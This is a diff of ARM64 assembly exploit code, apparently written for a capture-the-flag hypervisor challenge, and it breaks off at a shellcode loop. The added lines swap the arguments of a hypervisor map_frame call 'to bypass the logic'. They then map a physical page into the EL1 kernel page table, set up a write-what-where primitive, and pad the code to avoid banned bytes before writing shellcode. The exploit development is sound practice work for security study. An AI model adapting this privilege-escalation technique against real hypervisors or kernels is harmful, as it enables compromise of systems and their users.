@@ -4,34 +4,39 @@ NOP
 NOP
 
 // Replace a HVC mapping in the kernel
-MOV X0, #1       // hvc_mmap
-MOV X1, #0x4c3   // physical addr
-MOV X2, #0x100000 // flag
-MOV X3, XZR      // ?
-HVC 0
+// Normally map_frame(phy, attr, 0)
+// but we swap the arguments to bypass the logic
+MOV X0, #1        // hvc_map_frame
+MOV X1, #0x4c3    // attributes
+MOV X2, #0x100000 // physical addr
+MOV X3, XZR       // not used
+HVC 0             // map_frame(attr, phy, 0)
 
 // Create a new mapping into our HYP mapping
-LDR X22, =0xFFFFFFFFC00087EC // map_pa_kernel
-LDR X23, =0xFFFFFFFFC000b000
-
-//alloc_va(0, 0xffffffffc001b000, 0xffffffffc003a000, 0x006000000003a403)
 LDR X22, =0xFFFFFFFFC0008750 // alloc_va
 MOV W0, #0
-LDR X1, =0xffffffffc001b000  // EL1 page table
-LDR X2, =0xffffffffc003a000  // VA
-LDR X3, =0x0060000000000403  // Entry - map at PHY zero
+LDR X1, =0xffffffffc001b000  // EL1 kernel page table
+LDR X2, =0xffffffffc003a000  // VA - any available page
+LDR X3, =0x0060000000000403  // Entry - map at IPA zero
+// alloc_va(0, 0xffffffffc001b000, 0xffffffffc003a000, 0x006000000003a403)
 BLR X22
 
-LDR X22, =0xFFFFFFFFC0009AD8 // read_byte
+NOP // padding
+
+/////////////////////////////////
+// Write-what-where program
+////////////////////////////////
 
 OFFSET .req X9
 BASE .req X10
 
-LDR BASE, =0xffffffffc003a000  // VA
+LDR X22, =0xFFFFFFFFC0009AD8 // read_byte function
+LDR BASE, =0xffffffffc003a000  // Target virtual address base
 MOV OFFSET, XZR
-NOP
-NOP
 
+// padding to avoid banned bytes
+NOP
+NOP
 
 // Write our shellcode into the new page
 .loop:
